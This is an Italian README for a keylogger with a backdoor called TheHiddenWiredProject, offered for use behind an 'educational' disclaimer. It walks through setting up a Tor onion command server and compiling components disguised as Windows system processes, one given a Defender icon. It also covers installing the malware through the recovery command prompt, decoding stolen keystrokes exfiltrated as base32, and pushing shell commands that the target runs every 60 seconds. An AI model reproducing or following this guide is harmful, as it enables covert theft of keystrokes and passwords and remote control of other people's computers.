<pre>
QUESTO PROGETTO É STATO CREATO SOLO A SCOPO EDUCATIVO E SPERIMENTALE, NON USARLO SU PC CHE NON SONO DI TUA PROPRIETÀ O NON FANNO PARTE DEL TUO LAB VIRTUALE!
ANCHE SE I NOMI SCELTI SONO ULTRA STEALTH NON SIGNIFICA CHE DEVE ESSERE USATO IN MODO SBAGLIATO!

--------------------------------------- TheHiddenWiredProject ---------------------------------------

Cosa è TheHiddenWiredProject?
TheHiddenWiredProject (THWP) è un keylogger con backdoor integrata pensato per essere ultra stealth
perchè tutto il traffico generato è instradato via Tor!

È sicuro?
Yeah bro, è 100% safe, il codice lo puoi modificare come vuoi senza problemi, mentre Tor ti aiuta
a nascondere il tuo server (serve per ascoltare il keylogger e usare la backdoor).

Quindi devo configurare un server?
Yeah, è necessario per avere un livello di anonimato abbastanza alto

É pronto all'uso?
Assolutamente no, lo devi compilare tu, è ultra facile, continua a leggere che dopo lo spiego

Lo consigli?
Assolutamente si! Questo tool è estremamente compatto, ma nello stesso tempo ultra stealth,
non troveresti mai un keylogger con una backdoor via Tor su internet!

----------------------------------------------------------------------------------------------------

Passiamo alla teoria noiosa che è necessaria per configurare il server e compilare THWP

Partiamo dai requisiti necessari...

Un PC o una VM con linux (consiglio una distro debian-based come debian, ubuntu, mint.. ecc...)
Una connessione internet stabile (almeno 2Mbitps)

----------------------------------------------------------------------------------------------------
Creare e configurare il server Tor:

#Per evitare problemi diventa root con "sudo su"

#installa apache e tor
sudo apt install apache2 tor

#esegue ad ogni avvio in automatico
sudo systemctl enable apache2
sudo systemctl enable tor

#esegue i demoni
sudo systemctl start apache2
sudo systemctl start tor

#configura il server apache
cd /var/www/html
sudo rm **
sudo mkdir payloads_httpcmd
cd payloads_httpcmd
sudo nano default.txt (qui ci stanno i comandi che il target eseguirá ogni 60 secondi)

#modifica il file torrc
sudo nano /etc/tor/torrc

#Aggiungi le seguenti informazioni alla fine del file:

HiddenServiceDir /var/lib/tor/serverTHWP
HiddenServicePort 80 127.0.0.1:80

#La prima stringa "HiddenServiceDir" specifica dove tor andrà a salvare la config del server (NON METTERE DIRECTORY CUSTOM PER EVITARE PROBLEMI, LASCIALA COSÍ)
#La seconda stringa hosta sulla porta 80

#Adesso devi riavviare Tor per rendere effettive le modifiche
sudo systemctl restart tor

#Se hai dubbi vai su: https://community.torproject.org/onion-services/setup/
#Oppure chiedi a ChatGPT

#Adesso devi vedere il tuo dominio su tor, lo puoi vedere con:
cat /var/lib/tor/serverTHWP/hostname

#Per evitare problemi diventa root con "sudo su"

----------------------------------------------------------------------------------------------------

Adesso devi configurare TheHiddenWiredProject per fare in modo che indirizza il traffico verso il tuo dominio,
quindi modifica il file Isass.py, trova una variabile che si chiama "TARGET_ONION" (la trovi all'inizio),
e metti il tuo dominio (quello che finisce per .onion che hai trovato dentro il file hostname)

----------------------------------------------------------------------------------------------------

Adesso é tutto pronto! Puoi testare su una VM Windows il funzionamento, se tutto funziona puoi compilare tutto!

Per compilare tutto é necessaria una macchina Windows, useremo nuitka per trasformare i nostri file in python in eseguibili.

1) Installa Python nella macchina Windows (Non da MStore ma dal sito ufficiale)
2) Adesso apri il terminale e digita: pip install nuitka (Se pip non viene trovato, riavvia Windows dopo aver installato Python)
3) Adesso digita: nuitka --onefile --windows-disable-console file.py

#--onefile = unico file .exe
#--windows-disable-console = no prompt quando viene eseguito

4) Esegui nuitka per ogni file .py (Isass.py, WMIHost.py, wuasrvs.py)
5) Dopo aver compilato tutti i file py devi compilare SecurityHealthSystray.bat con Bat-To-Exe-Converter (Cercalo su internet) NB: INSTALLER.BAT DEVE RIMANERE RAW, NON DEVE ESSERE COMPILATO!
6) Aggiungi l'icona di defender al file .bat dentro il compilatore per avere un .exe con l'icona di Defender
----------------------------------------------------------------------------------------------------

Adesso hai quasi finito!
Copia il progetto compilato dentro una pendrive, copia il file installer.bat nella directory principale della chiavetta, rimuovi la cartella "WPE" 
e il risultato dovrebbe essere questo:

E:\Isass.exe
E:\Installer.bat
E:\SecurityHealthSystray.exe
E:\WMIHost.exe
E:\wuasrv.exe
E:\wuasrvs.exe

Se non corrisponde hai sbagliato qualcosa.


Come lo installo??
1) Avvia Windows
2) Una volta che ti trovi nella schermata di blocco, vai nel menu di spegnimento, tieni premuto "SHIFT" mentre premi su "Riavvia"
3) Dovresti leggere a schermo "Attendere"
4) Dopo il riavvio vai su: Risoluzione dei problemi > Opzioni avanzate > Prompt dei comandi
5) Adesso cerca la lettera della chiavetta (varia da PC a PC), prova dalla C alla J (basta scrivere nel prompt la lettera seguita dai due punti, quindi "c:")
6) Una volta trovata la pendrive esegui installer.bat
7) Il PC si riavvierá da solo e TheHiddenWiredProject sará installato!
8) Divertiti!
----------------------------------------------------------------------------------------------------

Adesso come controllo i tasti premuti?
I tasti premuti vengono salvati nel server su "/var/log/apache2/access.log" in base32 in stack da 32 caratteri, bisogna decodificare da base32 a plaintext, basta cercare su internet "base32 to text", incolli la request e vedi i tasti premuti.

Esempio:
root@debianVM:/var/log/apache2# cat access.log
127.0.0.1 - - "GET /CODICE_UNIVOCO_GENERATO/MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA" 404
127.0.0.1 - - "GET /CODICE_UNIVOCO_GENERATO/ORSXG5BBEE======" 404

Prendiamo in considerazione solo la base 32, quindi questa: MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA e questa: ORSXG5BBEE======
se la decodifichiamo diventa: 

stack1 "MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA" = ciaoo, questo é un 
stack2 "ORSXG5BBEE======" = test!!

----------------------------------------------------------------------------------------------------

Invece per eseguire codice nella macchina, tramite la backdoor, basta modificare il file: /var/www/html/payloads_httpcmd/default.txt
e scrivere codice shell per Windows, e verrá eseguito con i privilegi dell'utente corrente, possiamo anche scaricare file con curl ed eseguirli.
Ma attenzione, devi fare in modo che il codice shell non venga eseguito in loop, perché cosí rischi di fare casino, quindi una volta che vedi 
la richiesta del payload rimuovi il contenuto di default.txt, altrimenti il codice verrá eseguito ogni 60 secondi!

----------------------------------------------------------------------------------------------------

DIVERTITI IN MODO ETICO E SANO, SENZA FARE DANNI REALI A PERSONE, DATI O SISTEMI CHE NON TI APPARTENGONO!

</pre>
